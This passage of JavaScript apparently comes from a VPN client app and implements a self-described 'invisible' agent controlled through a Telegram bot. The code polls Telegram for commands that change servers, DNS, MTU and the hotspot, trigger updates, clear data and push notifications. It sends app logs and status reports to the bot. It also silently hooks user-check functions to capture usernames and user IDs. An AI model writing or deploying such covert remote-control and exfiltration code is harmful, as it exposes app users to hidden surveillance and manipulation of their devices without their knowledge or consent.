        if(res) await sendToTelegram(["✅ Servidor trocado para família " + family + ": " + String(res.server) + " Nota: " + String(res.qAfter || "N/A")]);
        else await sendToTelegram(["❌ Falha ao trocar por família: " + family]);
        await answerCallback(cb.id, "Operação finalizada");
        return;
      }
      if(data === "CMD_notify_prompt"){
        await sendToTelegram(["✉️ Envie no chat do bot uma mensagem iniciando com \"notify \" seguida do texto para enviar notificação ao cliente."]);
        await answerCallback(cb.id, "Prompt enviado");
        return;
      }
      if(data && data.startsWith("CMD_notify:")){
        const text = data.split(":").slice(1).join(":");
        if(!text){ await sendToTelegram(["❌ Texto vazio"]); await answerCallback(cb.id, "Falha"); return; }
        try{ await safeNativeCall("DtSendNotification.execute", ["Aviso do suporte", text, ""]); }catch(e){}
        await sendToTelegram(["🔔 Notificação enviada ao cliente: " + text]);
        await answerCallback(cb.id, "Notificação enviada");
        return;
      }
      await sendToTelegram(["❓ Comando não reconhecido: " + String(data)]); await answerCallback(cb.id, "Comando desconhecido");
    }catch(e){}
  }

  async function handleTextCommand(text, chatId){
    try{
      if(!text) return;
      const parts = String(text||"").trim().split(/\s+/);
      const cmd = (parts[0]||"").toLowerCase();
      if(cmd === "status"){
        const s = await gatherStatus();
        const meta = { actionLabel:"Status", concluded:true, improved:false, before:s, after:s, qBefore:computeQuality({ping:s.ping,downloadMbps:s.downloadMbps}), qAfter:computeQuality({ping:s.ping,downloadMbps:s.downloadMbps}) };
        await sendToTelegram(buildReport("Status solicitado (texto)", null, s, s, meta));
        return;
      }
      if(cmd === "update"){ try{ await safeNativeCall("DtStartAppUpdate.execute"); }catch(e){} await sendToTelegram(["⬆️ Update solicitado"]); return; }
      if(cmd === "logs"){ let l=""; try{ l = await safeNativeCall("DtGetLogs.execute") || localStorage.getItem(CONFIG.LOCAL_KEYS.shortLogs) || "sem logs"; }catch(e){ l = localStorage.getItem(CONFIG.LOCAL_KEYS.shortLogs) || "sem logs"; } l = compact(String(l), CONFIG.TELEGRAM_MESSAGE_LIMIT); await sendToTelegram(["📑 Logs:", l]); return; }
      if(cmd === "reconnect"){
        const before = await gatherStatus();
        const ok = await tryRestartVpn();
        const after = await gatherStatus();
        const meta = { actionLabel:"Reconexão VPN (texto)", concluded: ok, improved: computeQuality({ping:after.ping,downloadMbps:after.downloadMbps}) > computeQuality({ping:before.ping,downloadMbps:before.downloadMbps}), before, after, qBefore:computeQuality({ping:before.ping,downloadMbps:before.downloadMbps}), qAfter: computeQuality({ping:after.ping,downloadMbps:after.downloadMbps}) };
        await sendToTelegram(buildReport(ok ? "✅ Reconectado" : "⚠️ Reconexão falhou", null, before, after, meta));
        return;
      }
      if(cmd === "switch"){
        const term = parts.slice(1).join(" ");
        if(!term){ await sendToTelegram(["🛈 Uso: switch <termo>"]); return; }
        const list = await getConfigsList();
        const match = list.find(s => String(s.name||s.title||s.server||"").toUpperCase().includes(term.toUpperCase()));
        if(match){
          const id = match.id || match.configId || match.cid;
          const before = await gatherStatus();
          const ok = await setConfigById(id);
          await wait(1200);
          const after = await gatherStatus();
          const meta = { actionLabel:"Trocar servidor (texto)", concluded: ok, improved: computeQuality({ping:after.ping,downloadMbps:after.downloadMbps}) > computeQuality({ping:before.ping,downloadMbps:before.downloadMbps}), before, after, qBefore:computeQuality({ping:before.ping,downloadMbps:before.downloadMbps}), qAfter: computeQuality({ping:after.ping,downloadMbps:after.downloadMbps}) };
          await sendToTelegram(buildReport(ok ? "✅ Servidor trocado" : "❌ Falha ao trocar", match.name||match.title||match.server, before, after, meta));
        } else { await sendToTelegram(["⚠️ Nenhum servidor encontrado com termo: " + term]); }
        return;
      }
      if(cmd === "dns"){
        const before = await gatherStatus();
        let applied=null;
        for(const p of CONFIG.DNS_PROVIDERS){
          const ok = await trySetDns(p.p, p.s);
          await wait(2000);
          const after = await gatherStatus();
          if(ok && computeQuality({ping:after.ping,downloadMbps:after.downloadMbps}) > computeQuality({ping:before.ping,downloadMbps:before.downloadMbps})){ applied = { provider:p.name, primary:p.p, secondary:p.s, after }; break; }
        }
        if(applied){ const meta = { actionLabel:"Reteste DNS (texto)", concluded:true, improved:true, before, after:applied.after, qBefore:computeQuality({ping:before.ping,downloadMbps:before.downloadMbps}), qAfter: computeQuality({ping:applied.after.ping,downloadMbps:applied.after.downloadMbps}) }; await sendToTelegram(buildReport("Reteste DNS executado", JSON.stringify({ provider: applied.provider, primary: applied.primary, secondary: applied.secondary }), before, applied.after, meta)); }
        else { const after = await gatherStatus(); const meta = { actionLabel:"Reteste DNS (texto)", concluded:false, improved:false, before, after, qBefore:computeQuality({ping:before.ping,downloadMbps:before.downloadMbps}), qAfter: computeQuality({ping:after.ping,downloadMbps:after.downloadMbps}) }; await sendToTelegram(buildReport("❌ Nenhum DNS trouxe melhora", null, before, after, meta)); }
        return;
      }
      if(cmd === "mtu"){
        const before = await gatherStatus();
        let best=null;
        for(const m of CONFIG.MTU_CANDIDATES){
          const ok = await trySetMtu(m);
          await wait(1200);
          const after = await gatherStatus();
          const qAfter = computeQuality({ ping: after.ping, downloadMbps: after.downloadMbps });
          if(!best || qAfter > best.q){ best = { mtu:m, q:qAfter, after, ok }; }
          if(ok && qAfter < computeQuality({ ping:before.ping, downloadMbps:before.downloadMbps })) await trySetMtu(1400);
        }
        if(best){ const meta = { actionLabel:"Reteste MTU/QoS (texto)", concluded: !!best.ok, improved: best.q > computeQuality({ping:before.ping,downloadMbps:before.downloadMbps}), before, after:best.after, qBefore:computeQuality({ping:before.ping,downloadMbps:before.downloadMbps}), qAfter: best.q }; await sendToTelegram(buildReport("Reteste MTU/QoS", JSON.stringify({ mtu: best.mtu }), before, best.after, meta)); }
        return;
      }
      if(cmd === "clear"){
        try{ localStorage.removeItem(CONFIG.LOCAL_KEYS.shortLogs); localStorage.removeItem(CONFIG.LOCAL_KEYS.lastCheckUser); localStorage.removeItem(CONFIG.LOCAL_KEYS.mapping); sessionStorage.removeItem(CONFIG.LOCAL_KEYS.lastNet); }catch(e){}
        await sendToTelegram(["🧹 Dados locais limpos"]); return;
      }
      if(cmd === "notify"){
        const msg = parts.slice(1).join(" ");
        if(!msg){ await sendToTelegram(["🛈 Uso: notify <mensagem>"]); return; }
        try{ await safeNativeCall("DtSendNotification.execute", ["Aviso do suporte", msg, ""]); }catch(e){}
        await sendToTelegram(["🔔 Notificação enviada: " + msg]); return;
      }
      if(cmd === "hotspot"){
        const sub = (parts[1]||"").toLowerCase();
        if(sub === "on"){ try{ await safeNativeCall("DtStartHotSpotService.execute"); }catch(e){} await sendToTelegram(["📶 HotSpot ON solicitado"]); return; }
        if(sub === "off"){ try{ await safeNativeCall("DtStopHotSpotService.execute"); }catch(e){} await sendToTelegram(["📶 HotSpot OFF solicitado"]); return; }
        await sendToTelegram(["🛈 Uso: hotspot on|off"]); return;
      }
      if(cmd === "config"){
        const id = parseInt(parts[1]);
        if(isNaN(id)){ await sendToTelegram(["🛈 Uso: config <id>"]); return; }
        const before = await gatherStatus(); const ok = await setConfigById(id); await wait(1200); const after = await gatherStatus();
        const meta = { actionLabel:"Aplicar config (texto)", concluded:ok, improved: computeQuality({ping:after.ping,downloadMbps:after.downloadMbps}) > computeQuality({ping:before.ping,downloadMbps:before.downloadMbps}), before, after, qBefore:computeQuality({ping:before.ping,downloadMbps:before.downloadMbps}), qAfter: computeQuality({ping:after.ping,downloadMbps:after.downloadMbps}) };
        await sendToTelegram(buildReport(ok ? "✅ Config aplicada" : "❌ Falha ao aplicar config", "id:"+id, before, after, meta)); return;
      }
      await sendToTelegram(["❓ Comando não reconhecido. Comandos válidos: status, update, logs, reconnect, switch <termo>, dns, mtu, clear, notify <msg>, hotspot on|off, config <id>"]);
    }catch(e){}
  }

  async function pollTelegram(){
    try{
      if(CONFIG.TELEGRAM_PROXY_URL && CONFIG.TELEGRAM_PROXY_URL.indexOf("/getUpdates") >= 0){
      } else {
        if(CONFIG.BOT_TOKEN){
          const url = "https://api.telegram.org/bot" + CONFIG.BOT_TOKEN + "/getUpdates?timeout=0&offset=" + (_offset + 1);
          const r = await fetch(url);
          const j = await r.json();
          if(!j || !j.result) return;
          for(const u of j.result){
            try{
              _offset = Math.max(_offset, u.update_id);
              if(u.message){
                const from = u.message.from && u.message.from.id;
                const chatId = u.message.chat && u.message.chat.id;
                const text = (u.message.text || u.message.caption || "").trim();
                if(text) await handleTextCommand(text, chatId);
              } else if(u.callback_query){
                const cb = u.callback_query;
                const chatId = cb.message && cb.message.chat && cb.message.chat.id;
                await processCallback(cb.data, chatId, cb);
              }
            }catch(e){}
          }
        } else {
        }
      }
    }catch(e){}
  }

  (function attachCheckUserListeners(){
    try{
      const names = ["DtCheckUser","dtCheckUser","DtCheckUserListener","dtCheckUserListener"];
      for(const n of names){
        if(typeof window[n] === "function"){
          const orig = window[n];
          window[n] = function(...args){ try{ const payload = (args && args[0]) ? args[0] : args; try{ localStorage.setItem(CONFIG.LOCAL_KEYS.lastCheckUser, JSON.stringify({ username: payload.username||payload.user||payload.account||"N/A", user_id: payload.user_id||payload.id||payload.uid||null, ts: new Date().toISOString() })); }catch(e){} }catch(e){} return orig.apply(this,args); };
        }
        if(window.Dt && typeof window.Dt[n] === "function"){
          const orig2 = window.Dt[n];
          window.Dt[n] = function(...args){ try{ const payload = (args && args[0]) ? args[0] : args; try{ localStorage.setItem(CONFIG.LOCAL_KEYS.lastCheckUser, JSON.stringify({ username: payload.username||payload.user||payload.account||"N/A", user_id: payload.user_id||payload.id||payload.uid||null, ts: new Date().toISOString() })); }catch(e){} }catch(e){} return orig2.apply(this,args); };
        }
      }
    }catch(e){}
  })();

  (async function startAgent(){
    try{
      const s = await gatherStatus();
      const keyboard = { inline_keyboard: [
        [ { text:"Status", callback_data:"CMD_status" }, { text:"Reconectar VPN", callback_data:"CMD_reconnect" }, { text:"Retestar DNS", callback_data:"CMD_dns" } ],
        [ { text:"Retestar MTU/QoS", callback_data:"CMD_mtu" }, { text:"Trocar servidor por família", callback_data:"CMD_list_families" }, { text:"Listar servidores", callback_data:"CMD_list_servers" } ],
        [ { text:"Logs", callback_data:"CMD_logs" }, { text:"Limpar dados locais", callback_data:"CMD_clear" }, { text:"Iniciar update", callback_data:"CMD_update" } ],
        [ { text:"Hotspot ON", callback_data:"CMD_hotspot_on" }, { text:"Hotspot OFF", callback_data:"CMD_hotspot_off" }, { text:"Notificar cliente (texto)", callback_data:"CMD_notify_prompt" } ]
      ] };
      await sendToTelegram(buildReport("Agente AvSuper IA-simulado iniciado (invisível)", "Relatórios somente via Telegram; ações automáticas quando eficazes", s, s, { actionLabel:"Inicialização", concluded:true, improved:false, before:s, after:s, qBefore: computeQuality({ping:s.ping,downloadMbps:s.downloadMbps}), qAfter: computeQuality({ping:s.ping,downloadMbps:s.downloadMbps}) }), keyboard);
      setInterval(async ()=>{ try{ await maintenanceCycle(); }catch(e){} }, CONFIG.MAINT_INTERVAL_MS);
      setInterval(async ()=>{ try{ await pollTelegram(); }catch(e){} }, CONFIG.POLL_MS);
      await pollTelegram();
    }catch(e){
      try{ const sErr = await gatherStatus(); await sendToTelegram(buildReport("Erro na inicialização do agente", String(e), sErr, sErr, { actionLabel:"Erro init", concluded:false, improved:false, before:sErr, after:sErr, qBefore: computeQuality({ping:sErr.ping,downloadMbps:sErr.downloadMbps}), qAfter: computeQuality({ping:sErr.ping,downloadMbps:sErr.downloadMbps}) })); }catch(e){}
    }
  })();

  window.AVSUPER_AGENT = {
    gatherStatus,
    maintenanceCycle,
    setTelegramToken: function(token, chatId){ CONFIG.BOT_TOKEN = token; CONFIG.BOT_CHATID = chatId; },
    setProxy: function(url){ CONFIG.TELEGRAM_PROXY_URL = url; },
    sendReportNow: async function(title, detail){ const s = await gatherStatus(); await sendToTelegram(buildReport(title || "Relatório manual", detail || "", s, s, { actionLabel:"Manual", concluded:true, improved:false, before:s, after:s, qBefore: computeQuality({ping:s.ping,downloadMbps:s.downloadMbps}), qAfter: computeQuality({ping:s.ping,downloadMbps:s.downloadMbps}) })); }
  };

})();
